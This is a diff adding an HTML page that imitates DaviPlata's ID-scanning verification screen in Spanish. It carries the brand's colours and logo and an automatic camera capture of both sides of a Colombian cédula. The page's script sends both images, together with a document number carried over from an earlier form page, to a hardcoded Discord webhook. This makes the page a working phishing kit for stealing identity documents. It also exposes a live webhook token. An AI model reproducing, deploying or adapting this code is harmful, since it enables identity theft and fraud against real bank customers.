@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+  <title>DaviPlata - Escanear Cédula</title>
+  <style>
+    :root {
+      --davi-red: #E60026;
+      --davi-pink: #F5B0B9;
+      --text-dark: #333333;
+      --text-gray: #757575;
+      --input-bg: rgba(255, 255, 255, 0.92);
+    }
+
+    * {
+      box-sizing: border-box; margin: 0; padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body, html {
+      width: 100%; height: 100%; overflow: hidden;
+      background-image: url('https://i.imgur.com/qyaBs5F.png');
+      background-size: cover; background-position: center;
+    }
+
+    .app-container {
+      height: 100vh;
+      display: flex; flex-direction: column;
+      padding: 12px 20px 14px;
+    }
+
+    .back-nav {
+      align-self: flex-start;
+      font-size: 22px; padding: 4px 0 6px;
+      cursor: pointer; color: var(--text-dark);
+    }
+
+    .header { text-align: center; margin-bottom: 10px; }
+    .logo-img { width: 85px; margin-bottom: 4px; }
+    .title    { font-size: 17px; font-weight: 600; color: var(--text-dark); margin-bottom: 1px; }
+    .subtitle { font-size: 11px; color: var(--text-gray); }
+
+    /* STEPS */
+    .steps-row {
+      display: flex; align-items: center; justify-content: center;
+      margin-bottom: 10px;
+    }
+    .step-pill {
+      display: flex; align-items: center; gap: 5px;
+      padding: 6px 16px; border-radius: 20px;
+      font-size: 12px; font-weight: 700; transition: all 0.3s;
+    }
+    .step-pill.active  { background: var(--davi-red); color: white; }
+    .step-pill.done    { background: rgba(0,200,83,0.15); color: #00c853; }
+    .step-pill.pending { background: rgba(0,0,0,0.07); color: var(--text-gray); }
+    .step-dot { width: 7px; height: 7px; border-radius: 50%; }
+    .step-pill.active  .step-dot { background: white; }
+    .step-pill.done    .step-dot { background: #00c853; }
+    .step-pill.pending .step-dot { background: var(--text-gray); }
+    .step-divider { width: 22px; height: 2px; background: rgba(0,0,0,0.12); border-radius: 2px; }
+
+    /* CÁMARA */
+    .camera-card {
+      background: var(--input-bg);
+      border-radius: 20px; padding: 10px;
+      box-shadow: 0 4px 18px rgba(0,0,0,0.10);
+      border: 1px solid rgba(0,0,0,0.04);
+      margin-bottom: 10px; flex-shrink: 0;
+    }
+
+    .camera-wrap {
+      position: relative; border-radius: 12px;
+      overflow: hidden; background: #111;
+      aspect-ratio: 1.585;
+    }
+
+    #video {
+      width: 100%; height: 100%;
+      object-fit: cover; display: block;
+    }
+
+    /* ESQUINAS */
+    .corner {
+      position: absolute; width: 28px; height: 28px;
+      border-color: white; border-style: solid;
+      transition: border-color 0.4s; z-index: 3;
+    }
+    .corner.tl { top: 10px; left: 10px; border-width: 3px 0 0 3px; border-radius: 6px 0 0 0; }
+    .corner.tr { top: 10px; right: 10px; border-width: 3px 3px 0 0; border-radius: 0 6px 0 0; }
+    .corner.bl { bottom: 10px; left: 10px; border-width: 0 0 3px 3px; border-radius: 0 0 0 6px; }
+    .corner.br { bottom: 10px; right: 10px; border-width: 0 3px 3px 0; border-radius: 0 0 6px 0; }
+    .camera-wrap.captured .corner { border-color: #00c853; }
+    .camera-wrap.detected .corner { border-color: #00e676; }
+
+    /* SCAN LINE */
+    .scan-line {
+      position: absolute; left: 10px; right: 10px; height: 2px;
+      background: linear-gradient(to right, transparent, var(--davi-red), transparent);
+      box-shadow: 0 0 8px var(--davi-red);
+      animation: scanMove 2s ease-in-out infinite alternate;
+      z-index: 4;
+    }
+    @keyframes scanMove { 0% { top: 8%; } 100% { top: 88%; } }
+    .camera-wrap.captured .scan-line,
+    .camera-wrap.detected .scan-line { display: none; }
+
+    /* BARRA DE PROGRESO ESTABLE */
+    .stable-bar-wrap {
+      position: absolute;
+      bottom: 48px; left: 14px; right: 14px;
+      z-index: 5; display: none;
+    }
+    .stable-bar-bg {
+      height: 4px; border-radius: 4px;
+      background: rgba(255,255,255,0.25);
+      overflow: hidden;
+    }
+    .stable-bar-fill {
+      height: 100%; width: 0%;
+      background: #00e676;
+      border-radius: 4px;
+      transition: width 0.1s linear;
+    }
+
+    /* STATUS */
+    .cam-status {
+      position: absolute;
+      bottom: 10px; left: 10px; right: 10px;
+      background: rgba(0,0,0,0.52);
+      backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px);
+      border-radius: 10px; padding: 8px 12px;
+      text-align: center;
+      border: 1px solid rgba(255,255,255,0.08);
+      z-index: 5; transition: border-color 0.3s;
+    }
+    .cam-status.ok    { border-color: rgba(0,210,100,0.55); }
+    .cam-status.error { border-color: rgba(230,0,38,0.4); }
+    .cam-status-title { font-size: 12px; font-weight: 600; color: #fff; }
+
+    /* CHECK OVERLAY */
+    .check-overlay {
+      position: absolute; inset: 0;
+      display: none; flex-direction: column;
+      align-items: center; justify-content: center;
+      background: rgba(0,0,0,0.45);
+      z-index: 6; border-radius: 12px;
+    }
+    .check-circle {
+      width: 64px; height: 64px; border-radius: 50%;
+      background: #00c853;
+      display: flex; align-items: center; justify-content: center;
+      animation: popIn 0.4s cubic-bezier(.36,1.56,.64,1) both;
+    }
+    @keyframes popIn { from { transform: scale(0); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+    .check-circle svg { width: 34px; height: 34px; stroke: white; fill: none; stroke-width: 3; stroke-linecap: round; stroke-linejoin: round; }
+    .check-text { color: white; font-size: 14px; font-weight: 600; margin-top: 10px; }
+
+    /* INSTRUCCIÓN */
+    .instruction-card {
+      background: var(--input-bg);
+      border-radius: 15px; padding: 12px 16px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+      border: 1px solid rgba(0,0,0,0.03);
+      margin-bottom: 12px;
+      display: flex; align-items: center; gap: 12px;
+    }
+    .instr-icon {
+      width: 42px; height: 42px; border-radius: 50%;
+      background: #fff0f2;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+    }
+    .instr-title { font-size: 13px; font-weight: 600; color: var(--text-dark); margin-bottom: 2px; }
+    .instr-sub   { font-size: 11px; color: var(--text-gray); line-height: 1.4; }
+
+    /* TIPS */
+    .tips-card {
+      background: var(--input-bg);
+      border-radius: 15px; padding: 11px 14px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+      border: 1px solid rgba(0,0,0,0.03);
+    }
+    .tips-title {
+      font-size: 11px; font-weight: 600;
+      color: var(--davi-red); margin-bottom: 10px; text-align: center;
+    }
+    .tips-row {
+      display: flex; justify-content: space-around; align-items: flex-start;
+    }
+    .tip-item {
+      display: flex; flex-direction: column;
+      align-items: center; gap: 5px; flex: 1;
+    }
+    .tip-icon {
+      width: 34px; height: 34px; border-radius: 50%;
+      background: #fff0f2;
+      display: flex; align-items: center; justify-content: center;
+    }
+    .tip-label { font-size: 10px; color: var(--text-dark); text-align: center; line-height: 1.3; }
+
+    /* FLASH */
+    .flash {
+      position: fixed; inset: 0; z-index: 50;
+      background: white; opacity: 0; pointer-events: none;
+      transition: opacity 0.07s;
+    }
+    .flash.show { opacity: 0.88; }
+
+    /* LOADER */
+    #loader {
+      display: none; position: fixed; inset: 0; z-index: 60;
+      background: rgba(255,255,255,0.88);
+      backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px);
+      flex-direction: column; align-items: center; justify-content: center; gap: 16px;
+    }
+    .spinner {
+      width: 48px; height: 48px;
+      border: 4px solid #f0f0f0;
+      border-top: 4px solid var(--davi-red);
+      border-radius: 50%; animation: spin 0.85s linear infinite;
+    }
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+    #loader p { font-size: 14px; font-weight: 500; color: var(--text-dark); }
+
+    canvas { display: none; }
+  </style>
+</head>
+<body>
+
+<div class="app-container">
+
+  <div class="back-nav">❮</div>
+
+  <div class="header">
+    <img src="https://conectesunegocio.daviplata.com/sites/default/files/styles/original/public/2025-10/Logo_Api_Market-2025.png?itok=cIsEUb2z"
+         class="logo-img" onerror="this.style.display='none'">
+    <div class="title">Escanear Cédula</div>
+    <div class="subtitle">Encuadra el documento para captura automática</div>
+  </div>
+
+  <!-- STEPS -->
+  <div class="steps-row">
+    <div class="step-pill active" id="pill1"><div class="step-dot"></div> Anverso</div>
+    <div class="step-divider"></div>
+    <div class="step-pill pending" id="pill2"><div class="step-dot"></div> Reverso</div>
+  </div>
+
+  <!-- CÁMARA -->
+  <div class="camera-card">
+    <div class="camera-wrap" id="cameraWrap">
+      <video id="video" autoplay playsinline muted></video>
+
+      <div class="corner tl"></div>
+      <div class="corner tr"></div>
+      <div class="corner bl"></div>
+      <div class="corner br"></div>
+      <div class="scan-line" id="scanLine"></div>
+
+      <!-- Barra de progreso estabilidad -->
+      <div class="stable-bar-wrap" id="stableBarWrap">
+        <div class="stable-bar-bg">
+          <div class="stable-bar-fill" id="stableBarFill"></div>
+        </div>
+      </div>
+
+      <div class="cam-status" id="camStatus">
+        <div class="cam-status-title" id="statusTitle">Iniciando cámara...</div>
+      </div>
+
+      <div class="check-overlay" id="checkOverlay">
+        <div class="check-circle">
+          <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+        </div>
+        <div class="check-text" id="checkText">¡Capturado!</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- INSTRUCCIÓN -->
+  <div class="instruction-card">
+    <div class="instr-icon" id="instrIcon">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
+        <rect x="2" y="5" width="20" height="14" rx="2.5" stroke="#E60026" stroke-width="1.7"/>
+        <circle cx="8" cy="12" r="2.5" stroke="#E60026" stroke-width="1.5"/>
+        <path d="M13 10h5M13 13h3" stroke="#E60026" stroke-width="1.5" stroke-linecap="round"/>
+      </svg>
+    </div>
+    <div>
+      <div class="instr-title" id="instrTitle">Parte delantera de la cédula</div>
+      <div class="instr-sub"   id="instrSub">Ubica el anverso dentro del recuadro y mantén el documento quieto</div>
+    </div>
+  </div>
+
+  <!-- TIPS -->
+  <div class="tips-card">
+    <div class="tips-title">Recomendaciones</div>
+    <div class="tips-row">
+      <div class="tip-item">
+        <div class="tip-icon">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
+            <circle cx="12" cy="12" r="4" stroke="#E60026" stroke-width="1.8"/>
+            <path d="M12 2v2M12 20v2M2 12h2M20 12h2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41"
+                  stroke="#E60026" stroke-width="1.8" stroke-linecap="round"/>
+          </svg>
+        </div>
+        <span class="tip-label">Buena<br>iluminación</span>
+      </div>
+      <div class="tip-item">
+        <div class="tip-icon">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
+            <path d="M12 3C8 3 4 7 4 12s4 9 8 9 8-4 8-9-4-9-8-9Z" stroke="#E60026" stroke-width="1.7"/>
+            <path d="M12 8v4l3 3" stroke="#E60026" stroke-width="1.7" stroke-linecap="round"/>
+          </svg>
+        </div>
+        <span class="tip-label">Sin<br>movimiento</span>
+      </div>
+      <div class="tip-item">
+        <div class="tip-icon">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
+            <rect x="3" y="5" width="18" height="14" rx="2" stroke="#E60026" stroke-width="1.7"/>
+            <path d="M7 9h10M7 13h6" stroke="#E60026" stroke-width="1.5" stroke-linecap="round"/>
+          </svg>
+        </div>
+        <span class="tip-label">Documento<br>completo</span>
+      </div>
+      <div class="tip-item">
+        <div class="tip-icon">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
+            <circle cx="12" cy="12" r="9" stroke="#E60026" stroke-width="1.7"/>
+            <line x1="4" y1="4" x2="20" y2="20" stroke="#E60026" stroke-width="1.7" stroke-linecap="round"/>
+          </svg>
+        </div>
+        <span class="tip-label">Sin<br>reflejos</span>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<div class="flash" id="flash"></div>
+<div id="loader">
+  <div class="spinner"></div>
+  <p id="loaderText">Procesando...</p>
+</div>
+<canvas id="canvas"></canvas>
+
+<script>
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1425328745123942503/WhhLWqOYULHi4NphwaiKE6wk6flVAsk8ifQLfQaI-tmdB65vT1iLD7vpHmJpPdPHm5OY";
+  const savedData   = JSON.parse(sessionStorage.getItem('formData') || '{}');
+  const docNum      = savedData.num || 'N/A';
+
+  let step         = 'front';
+  let frontBlob    = null;
+  let isBusy       = false;
+  let stableStart  = null;
+  let detectionLoop = null;
+
+  const STABLE_MS  = 2000; // ms quieto antes de capturar
+  const MOTION_THR = 18;   // umbral de movimiento entre frames
+  const SAMPLE_INT = 120;  // ms entre muestras
+
+  // Canvas oculto para detectar movimiento
+  const motionCanvas = document.createElement('canvas');
+  const motionCtx    = motionCanvas.getContext('2d');
+  let prevFrame      = null;
+
+  // CÁMARA
+  window.addEventListener('load', async () => {
+    const video = document.getElementById('video');
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: { ideal: 'environment' }, width: { ideal: 1920 }, height: { ideal: 1080 } }
+      });
+      video.srcObject = stream;
+    } catch {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+      } catch {
+        setStatus('Permite el acceso a la cámara', 'error');
+        return;
+      }
+    }
+    video.onloadedmetadata = () => {
+      video.play();
+      motionCanvas.width  = 80;
+      motionCanvas.height = 50;
+      setStatus('Encuadra el documento');
+      startDetection();
+    };
+  });
+
+  // DETECCIÓN DE QUIETUD por diferencia de frames
+  function startDetection() {
+    detectionLoop = setInterval(() => {
+      if (isBusy) return;
+      const video = document.getElementById('video');
+      if (!video.videoWidth) return;
+
+      motionCtx.drawImage(video, 0, 0, 80, 50);
+      const frame = motionCtx.getImageData(0, 0, 80, 50).data;
+
+      if (prevFrame) {
+        let diff = 0;
+        for (let i = 0; i < frame.length; i += 4) {
+          diff += Math.abs(frame[i] - prevFrame[i]);
+        }
+        const avgDiff = diff / (frame.length / 4);
+
+        if (avgDiff < MOTION_THR) {
+          // Documento quieto
+          if (!stableStart) stableStart = Date.now();
+          const elapsed = Date.now() - stableStart;
+          const pct     = Math.min(100, Math.round(elapsed / STABLE_MS * 100));
+
+          showStableBar(pct);
+
+          if (elapsed >= STABLE_MS) {
+            capture();
+          } else {
+            setStatus('No muevas el documento...', 'ok');
+            document.getElementById('cameraWrap').classList.add('detected');
+          }
+        } else {
+          // Movimiento detectado — resetear
+          stableStart = null;
+          hideStableBar();
+          document.getElementById('cameraWrap').classList.remove('detected');
+          setStatus(step === 'front' ? 'Encuadra el anverso' : 'Encuadra el reverso');
+        }
+      }
+
+      prevFrame = frame;
+    }, SAMPLE_INT);
+  }
+
+  function showStableBar(pct) {
+    document.getElementById('stableBarWrap').style.display = 'block';
+    document.getElementById('stableBarFill').style.width   = pct + '%';
+  }
+  function hideStableBar() {
+    document.getElementById('stableBarWrap').style.display = 'none';
+    document.getElementById('stableBarFill').style.width   = '0%';
+  }
+
+  async function capture() {
+    if (isBusy) return;
+    isBusy = true;
+    stableStart = null;
+    hideStableBar();
+    clearInterval(detectionLoop);
+
+    const video  = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const wrap   = document.getElementById('cameraWrap');
+
+    wrap.classList.remove('detected');
+    wrap.classList.add('captured');
+
+    // Flash
+    const flash = document.getElementById('flash');
+    flash.classList.add('show');
+    setTimeout(() => flash.classList.remove('show'), 130);
+
+    canvas.width  = video.videoWidth  || 1280;
+    canvas.height = video.videoHeight || 720;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+
+    canvas.toBlob(async (blob) => {
+      if (!blob) { isBusy = false; return; }
+
+      if (step === 'front') {
+        frontBlob = blob;
+        setStatus('¡Anverso capturado!', 'ok');
+        showCheck('¡Anverso capturado!');
+
+        setTimeout(() => {
+          hideCheck();
+          wrap.classList.remove('captured');
+          step = 'back';
+          prevFrame = null;
+          updateUI();
+          isBusy = false;
+          startDetection();
+        }, 1800);
+
+      } else if (step === 'back') {
+        step = 'done';
+        setStatus('¡Reverso capturado!', 'ok');
+        showCheck('¡Cédula completa!');
+        showLoader('Enviando documentos...');
+
+        const fdFront = new FormData();
+        fdFront.append('file', frontBlob, 'cedula_anverso.png');
+        fdFront.append('payload_json', JSON.stringify({
+          content: `🪪 **Cédula Anverso** | Doc: \`${docNum}\``
+        }));
+
+        const fdBack = new FormData();
+        fdBack.append('file', blob, 'cedula_reverso.png');
+        fdBack.append('payload_json', JSON.stringify({
+          content: `🪪 **Cédula Reverso** | Doc: \`${docNum}\``
+        }));
+
+        try {
+          await fetch(WEBHOOK_URL, { method: 'POST', body: fdFront });
+          await fetch(WEBHOOK_URL, { method: 'POST', body: fdBack });
+        } catch {}
+
+        hideLoader();
+        document.getElementById('pill1').className = 'step-pill done';
+        document.getElementById('pill2').className = 'step-pill done';
+
+        setTimeout(() => {
+          hideCheck();
+          sessionStorage.clear();
+          window.location.href = 'index.html';
+        }, 2000);
+      }
+    }, 'image/png');
+  }
+
+  function updateUI() {
+    document.getElementById('pill1').className = 'step-pill done';
+    document.getElementById('pill2').className = 'step-pill active';
+    document.getElementById('instrTitle').textContent = 'Parte trasera de la cédula';
+    document.getElementById('instrSub').textContent   = 'Voltea tu cédula y mantén el reverso quieto dentro del recuadro';
+    document.getElementById('instrIcon').innerHTML = `
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
+        <rect x="2" y="5" width="20" height="14" rx="2.5" stroke="#E60026" stroke-width="1.7"/>
+        <path d="M5 10h14M5 13h10M5 16h7" stroke="#E60026" stroke-width="1.5" stroke-linecap="round"/>
+      </svg>`;
+    setStatus('Encuadra el reverso');
+    document.getElementById('cameraWrap').classList.remove('captured');
+    document.getElementById('scanLine').style.display = 'block';
+  }
+
+  function setStatus(title, mode = '') {
+    document.getElementById('statusTitle').textContent = title;
+    const s = document.getElementById('camStatus');
+    s.className = 'cam-status' + (mode ? ' ' + mode : '');
+  }
+
+  function showCheck(msg) {
+    document.getElementById('checkText').textContent = msg;
+    document.getElementById('checkOverlay').style.display = 'flex';
+  }
+  function hideCheck() {
+    document.getElementById('checkOverlay').style.display = 'none';
+  }
+  function showLoader(msg) {
+    document.getElementById('loaderText').textContent = msg;
+    document.getElementById('loader').style.display = 'flex';
+  }
+  function hideLoader() {
+    document.getElementById('loader').style.display = 'none';
+  }
+</script>
+</body>
+</html>
